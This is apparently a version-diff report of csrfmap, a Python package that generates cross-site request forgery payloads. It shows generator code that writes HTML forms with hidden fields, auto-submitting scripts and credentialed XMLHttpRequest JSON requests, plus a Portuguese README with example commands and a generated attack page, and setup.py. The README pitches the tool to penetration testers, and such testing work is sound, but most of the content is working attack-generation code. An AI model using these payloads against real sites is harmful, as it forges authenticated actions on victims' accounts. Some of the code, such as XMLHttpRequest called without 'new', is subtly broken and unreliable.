+            f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
+            "\t</form>\r\n"
+            "</body>\r\n"]  
+
+        if "csrf.html" in os.listdir():
+            if "Linux" in list(os.uname()):
+                os.system("rm -f csrf.html")
+            elif "Windows" in list(os.uname()):
+                os.system("del csrf.html")
+
+        with open("./csrf.html","a") as arquivo:
+            for tag in lista:
+                arquivo.write(tag)
+                if "method" in tag:
+                    for input in dicionario:
+                        arquivo.write(dicionario[input])
+                    arquivo.write("\t<input type=\"submit\">Enviar</input>\r\n")
+            arquivo.write("</html>\r\n")
+
+    def CSRFNoUserInteraction(self:object):
+        dicionario = {}
+        for name,value in enumerate(self.__name):
+            dicionario[self.__name[name]] = f"\t<input name=\"{value}\" value=\"{self.__value[name]}\" type=\"hidden\"/>\r\n"
+
+        lista = ["<!DOCTYPE html>\r\n",
+            "<html lang=\"pt-br\">\r\n",
+            "<body>\r\n",
+            f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
+            "\t</form>\r\n"
+            "</body>\r\n"]
+
+        if "csrf_nouser.html" in os.listdir():
+            if "Linux" in list(os.uname()):
+                os.system("rm -f csrf_nouser.html")
+            elif "Windows" in list(os.uname()):
+                os.system("del csrf_nouser.html")
+
+        with open("./csrf_nouser.html","a") as arquivo:
+            for tag in lista:
+                arquivo.write(tag)
+                if "method" in tag:
+                    for input in dicionario:
+                        arquivo.write(dicionario[input])
+                    arquivo.write("\t<script> document.forms[0].submit();</script>\r\n")
+            arquivo.write("</html>\r\n")
+
+    def CSRFJson(self:object):
+        dicionario = {}
+        for name,value in enumerate(self.__name):
+            dicionario[self.__name[name]] = self.__value[name]
+        
+        lista = ["<!DOCTYPE html>\r\n",
+            "<html lang=\"pt-br\">\r\n",
+            "<body>\r\n",
+            "\t<script>\r\n",
+            "\tvar csrf = XMLHttpRequest();\r\n",
+            f"\tcsrf.open(\"{self.__method}\",\"{self.__action}\");\r\n",
+            "\tcsrf.setRequestHeader(\"Content-Type\",\"application/json\");\r\n"
+            ]
+
+        if "csrfjson1.html" in os.listdir():
+            if "Linux" in list(os.uname()):
+                os.system("rm -f csrfjson1.html")
+            elif "Windows" in list(os.uname()):
+                os.system("del csrfjson1.html")    
+
+        with open("./csrfjson1.html","a") as arquivo:
+            for tag in lista:
+                arquivo.write(tag)
+                if "setRequestHeader" in tag:
+                    arquivo.write(f"\tcsrf.send({dicionario});\r\n")
+                    arquivo.write(f"\t</script>\r\n")
+                    arquivo.write(f"</body>\r\n")
+                    arquivo.write(f"</html>")
+
+    def CSRFJsonCredentials(self:object):
+        dicionario = {}
+        for name,value in enumerate(self.__name):
+            dicionario[self.__name[name]] = self.__value[name]
+        
+        lista = ["<!DOCTYPE html>\r\n",
+            "<html lang=\"pt-br\">\r\n",
+            "<body>\r\n",
+            "\t<script>\r\n",
+            "\tvar csrf = XMLHttpRequest();\r\n",
+            f"\tcsrf.open(\"{self.__method}\",\"{self.__action}\");\r\n",
+            "\tcsrf.setRequestHeader(\"Content-Type\",\"application/json\");\r\n",
+            "\tcsrf.withCredentials = true;\r\n"
+            ]
+
+        if "csrfjson2.html" in os.listdir():
+            if "Linux" in list(os.uname()):
+                os.system("rm -f csrfjson2.html")
+            elif "Windows" in list(os.uname()):
+                os.system("del csrfjson2.html")      
+
+        with open("./csrfjson2.html","a") as arquivo:
+            for tag in lista:
+                arquivo.write(tag)
+                if "withCredentials" in tag:
+                    arquivo.write(f"\tcsrf.send({dicionario});\r\n")
+                    arquivo.write(f"\t</script>\r\n")
+                    arquivo.write(f"</body>\r\n")
                     arquivo.write(f"</html>")
```

### Comparing `csrfmap-0.0.1/csrfmap.egg-info/PKG-INFO` & `csrfmap-0.0.2/csrfmap.egg-info/PKG-INFO`

 * *Files 12% similar despite different names*

```diff
@@ -1,119 +1,119 @@
-Metadata-Version: 2.1
-Name: csrfmap
-Version: 0.0.1
-Summary: Tool to generate payloads focused on CSRF
-Home-page: https://github.com/joaoviictorti/csrfmap
-Author: joaoviictorti (viictorjj)
-Author-email: joaovictorti08@gmail.com
-License: MIT License
-Keywords: CSRF requests python security
-Classifier: Development Status :: 5 - Production/Stable
-Classifier: Environment :: Console
-Classifier: Intended Audience :: System Administrators
-Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
-Classifier: Natural Language :: English
-Classifier: Operating System :: OS Independent
-Classifier: Programming Language :: Python
-Classifier: Programming Language :: Python :: 3
-Classifier: Programming Language :: Python :: 3.8
-Classifier: Programming Language :: Python :: 3.9
-Classifier: Programming Language :: Python :: 3.10
-Classifier: Programming Language :: Python :: 3.11
-Classifier: Programming Language :: Python :: 3 :: Only
-Classifier: Programming Language :: Python :: Implementation :: PyPy
-Classifier: Topic :: Security
-Classifier: Topic :: System :: Networking
-Classifier: Topic :: System :: Operating System
-Classifier: Topic :: System :: Systems Administration
-Classifier: Topic :: Utilities
-Requires-Python: >=3.6, <4
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
-
-[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=csrfmap)](https://git.io/typing-svg)
-
-
-
-<h4 align="center"> Tool to generate payloads focused on CSRF </h4>
-
-
-<p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-revshell">Usage</a>
-</p>
-
----
-
-
-O csrfmap é uma ferramenta que gera payloads de Cross-site request forgery. Possui uma funcionalidade que gera diversas possibilidades de exploração.
-
-Projetei o `csrfmap`  e mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
-
-# Características
-
- - Gera payloads CSRF com foco em exploração de falsificação de requisições entre sites.
-
-# Forma de utilização
-
-```sh
-csrfmap -a "http://exemplo.com" -m post -t forminteraction -n username password token -v victor password 132423542
-```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
-```yaml
- _____ _____ _____ _____ _____ _____ _____ 
-|     |   __| __  |   __|     |  _  |  _  |
-|   --|__   |    -|   __| | | |     |   __|
-|_____|_____|__|__|__|  |_|_|_|__|__|__|   
-                                                       
-                        v0.0.1 - @joaoviictorti 
-
-options:
-  -h, --help            show this help message and exit
-  -a ACTION, -A ACTION  Insert action
-  -m METHOD, -M METHOD  Insert method
-  -p {form1,form2,json1,json2}
-  -n NAME [NAME ...], -name NAME [NAME ...] Insert name
-  -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values
-
-```
-
-# Instalação
-
-csrfmap requer **python3** e para baixá-lo só usar:
-
-```sh
-pip3 install csrfmap
-```
-
-# Executando csrfmap
-
-```console
-csrfmap -a "http://exemplo.com" -m post -p form1 -n username password token -v victor password 132423542
-
- _____ _____ _____ _____ _____ _____ _____ 
-|     |   __| __  |   __|     |  _  |  _  |
-|   --|__   |    -|   __| | | |     |   __|
-|_____|_____|__|__|__|  |_|_|_|__|__|__|   
-                                                       
-                        v0.0.1 - @joaoviictorti   
-
-csrf.html:
-<!DOCTYPE html>
-<html lang="pt-br">
-<body>
-	<form action="http://exemplo.com" method="post">
-	<input name="username" value="victor" type="hidden"/>
-	<input name="password" value="password" type="hidden"/>
-	<input name="token" value="132423542" type="hidden"/>
-	<input type="submit">Enviar</input>
-	</form>
-</body>
-</html>
-
-```
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
+Metadata-Version: 2.1
+Name: csrfmap
+Version: 0.0.2
+Summary: Tool to generate payloads focused on CSRF
+Home-page: https://github.com/joaoviictorti/csrfmap
+Author: joaoviictorti (viictorjj)
+Author-email: joaovictorti08@gmail.com
+License: MIT License
+Keywords: CSRF requests python security
+Classifier: Development Status :: 5 - Production/Stable
+Classifier: Environment :: Console
+Classifier: Intended Audience :: System Administrators
+Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
+Classifier: Natural Language :: English
+Classifier: Operating System :: OS Independent
+Classifier: Programming Language :: Python
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3 :: Only
+Classifier: Programming Language :: Python :: Implementation :: PyPy
+Classifier: Topic :: Security
+Classifier: Topic :: System :: Networking
+Classifier: Topic :: System :: Operating System
+Classifier: Topic :: System :: Systems Administration
+Classifier: Topic :: Utilities
+Requires-Python: >=3.6, <4
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
+
+[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=csrfmap)](https://git.io/typing-svg)
+
+
+
+<h4 align="center"> Tool to generate payloads focused on CSRF </h4>
+
+
+<p align="center">
+  <a href="#características">Features</a> •
+  <a href="#instalação">Install</a> •
+  <a href="#forma-de-utilização">How to use</a> •
+  <a href="#executando-revshell">Usage</a>
+</p>
+
+---
+
+
+O csrfmap é uma ferramenta que gera payloads de Cross-site request forgery. Possui uma funcionalidade que gera diversas possibilidades de exploração.
+
+Projetei o `csrfmap`  e mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
+
+# Características
+
+ - Gera payloads CSRF com foco em exploração de falsificação de requisições entre sites.
+
+# Forma de utilização
+
+```sh
+csrfmap -a "http://exemplo.com" -m post -t forminteraction -n username password token -v victor password 132423542
+```
+Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+```yaml
+ _____ _____ _____ _____ _____ _____ _____ 
+|     |   __| __  |   __|     |  _  |  _  |
+|   --|__   |    -|   __| | | |     |   __|
+|_____|_____|__|__|__|  |_|_|_|__|__|__|   
+                                                       
+                        v0.0.2 - @joaoviictorti 
+
+options:
+  -h, --help            show this help message and exit
+  -a ACTION, -A ACTION  Insert action
+  -m METHOD, -M METHOD  Insert method
+  -p {form1,form2,json1,json2}
+  -n NAME [NAME ...], -name NAME [NAME ...] Insert name
+  -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values
+
+```
+
+# Instalação
+
+csrfmap requer **python3** e para baixá-lo só usar:
+
+```sh
+pip3 install csrfmap
+```
+
+# Executando csrfmap
+
+```console
+csrfmap -a "http://exemplo.com" -m post -p form1 -n username password token -v victor password 132423542
+
+ _____ _____ _____ _____ _____ _____ _____ 
+|     |   __| __  |   __|     |  _  |  _  |
+|   --|__   |    -|   __| | | |     |   __|
+|_____|_____|__|__|__|  |_|_|_|__|__|__|   
+                                                       
+                        v0.0.2 - @joaoviictorti   
+
+csrf.html:
+<!DOCTYPE html>
+<html lang="pt-br">
+<body>
+	<form action="http://exemplo.com" method="post">
+	<input name="username" value="victor" type="hidden"/>
+	<input name="password" value="password" type="hidden"/>
+	<input name="token" value="132423542" type="hidden"/>
+	<input type="submit">Enviar</input>
+	</form>
+</body>
+</html>
+
+```
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: csrfmap Version: 0.0.1 Summary: Tool to generate
+Metadata-Version: 2.1 Name: csrfmap Version: 0.0.2 Summary: Tool to generate
 payloads focused on CSRF Home-page: https://github.com/joaoviictorti/csrfmap
 Author: joaoviictorti (viictorjj) Author-email: joaovictorti08@gmail.com
 License: MIT License Keywords: CSRF requests python security Classifier:
 Development Status :: 5 - Production/Stable Classifier: Environment :: Console
 Classifier: Intended Audience :: System Administrators Classifier: License ::
 OSI Approved :: GNU General Public License v3 (GPLv3) Classifier: Natural
 Language :: English Classifier: Operating System :: OS Independent Classifier:
@@ -28,20 +28,20 @@
 para tornÃ¡-lo Ãºtil para testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera
 payloads CSRF com foco em exploraÃ§Ã£o de falsificaÃ§Ã£o de requisiÃ§Ãµes entre
 sites. # Forma de utilizaÃ§Ã£o ```sh csrfmap -a "http://exemplo.com" -m post -
 t forminteraction -n username password token -v victor password 132423542 ```
 Isso exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os switches que ele
 suporta: ```yaml _____ _____ _____ _____ _____ _____ _____ | | __| __ | __| | _
 | _ | | --|__ | -| __| | | | | __| |_____|_____|__|__|__| |_|_|_|__|__|__|
-v0.0.1 - @joaoviictorti options: -h, --help show this help message and exit -
+v0.0.2 - @joaoviictorti options: -h, --help show this help message and exit -
 a ACTION, -A ACTION Insert action -m METHOD, -M METHOD Insert method -p
 {form1,form2,json1,json2} -n NAME [NAME ...], -name NAME [NAME ...] Insert name
 -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values ``` # InstalaÃ§Ã£o
 csrfmap requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install
 csrfmap ``` # Executando csrfmap ```console csrfmap -a "http://exemplo.com" -
 m post -p form1 -n username password token -v victor password 132423542 _____
 _____ _____ _____ _____ _____ _____ | | __| __ | __| | _ | _ | | --|__ | -| __|
-| | | | __| |_____|_____|__|__|__| |_|_|_|__|__|__| v0.0.1 - @joaoviictorti
+| | | | __| |_____|_____|__|__|__| |_|_|_|__|__|__| v0.0.2 - @joaoviictorti
 csrf.html:
    [Submit]Enviar
 ``` [https://capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `csrfmap-0.0.1/setup.py` & `csrfmap-0.0.2/setup.py`

 * *Ordering differences only*

 * *Files 24% similar despite different names*

```diff
@@ -1,52 +1,52 @@
-#!/usr/bin/python3
-# -*- coding: UTF-8 -*-
-from setuptools import setup, find_packages
-import os
-
-meta = {}
-here = os.path.abspath(os.path.dirname(__file__))
-
-with open(f"{here}/csrfmap/__meta__.py",encoding="utf-8") as arquivo:
-    exec(arquivo.read(), meta)
-
-with open("README.md", "r",encoding="utf-8") as arq:
-    readme = arq.read()
-
-setup(name=meta["__title__"],
-    version=meta["__version__"],
-    license='MIT License',
-    author=meta["__author__"],
-    url=meta["__url__"],
-    long_description=readme,
-    long_description_content_type="text/markdown",
-    author_email=meta["__author_email__"],
-    keywords='CSRF requests python security',
-    description=meta["__description__"],
-    packages=find_packages(),
-    zip_safe=False,
-    python_requires=">=3.6, <4",
-    classifiers=[
-        "Development Status :: 5 - Production/Stable",
-        "Environment :: Console",
-        "Intended Audience :: System Administrators",
-        "License :: OSI Approved :: GNU General Public License v3 (GPLv3)",
-        "Natural Language :: English",
-        "Operating System :: OS Independent",
-        "Programming Language :: Python",
-        "Programming Language :: Python :: 3",
-        "Programming Language :: Python :: 3.8",
-        "Programming Language :: Python :: 3.9",
-        "Programming Language :: Python :: 3.10",
-        "Programming Language :: Python :: 3.11",
-        "Programming Language :: Python :: 3 :: Only",
-        "Programming Language :: Python :: Implementation :: PyPy",
-        "Topic :: Security",
-        "Topic :: System :: Networking",
-        "Topic :: System :: Operating System",
-        "Topic :: System :: Systems Administration",
-        "Topic :: Utilities"
-    ],
-    entry_points={'console_scripts': [
-        'csrfmap=csrfmap.csrfmap:argumentos',
-        ]
+#!/usr/bin/python3
+# -*- coding: UTF-8 -*-
+from setuptools import setup, find_packages
+import os
+
+meta = {}
+here = os.path.abspath(os.path.dirname(__file__))
+
+with open(f"{here}/csrfmap/__meta__.py",encoding="utf-8") as arquivo:
+    exec(arquivo.read(), meta)
+
+with open("README.md", "r",encoding="utf-8") as arq:
+    readme = arq.read()
+
+setup(name=meta["__title__"],
+    version=meta["__version__"],
+    license='MIT License',
+    author=meta["__author__"],
+    url=meta["__url__"],
+    long_description=readme,
+    long_description_content_type="text/markdown",
+    author_email=meta["__author_email__"],
+    keywords='CSRF requests python security',
+    description=meta["__description__"],
+    packages=find_packages(),
+    zip_safe=False,
+    python_requires=">=3.6, <4",
+    classifiers=[
+        "Development Status :: 5 - Production/Stable",
+        "Environment :: Console",
+        "Intended Audience :: System Administrators",
+        "License :: OSI Approved :: GNU General Public License v3 (GPLv3)",
+        "Natural Language :: English",
+        "Operating System :: OS Independent",
+        "Programming Language :: Python",
+        "Programming Language :: Python :: 3",
+        "Programming Language :: Python :: 3.8",
+        "Programming Language :: Python :: 3.9",
+        "Programming Language :: Python :: 3.10",
+        "Programming Language :: Python :: 3.11",
+        "Programming Language :: Python :: 3 :: Only",
+        "Programming Language :: Python :: Implementation :: PyPy",
+        "Topic :: Security",
+        "Topic :: System :: Networking",
+        "Topic :: System :: Operating System",
+        "Topic :: System :: Systems Administration",
+        "Topic :: Utilities"
+    ],
+    entry_points={'console_scripts': [
+        'csrfmap=csrfmap.csrfmap:argumentos',
+        ]
     })
```

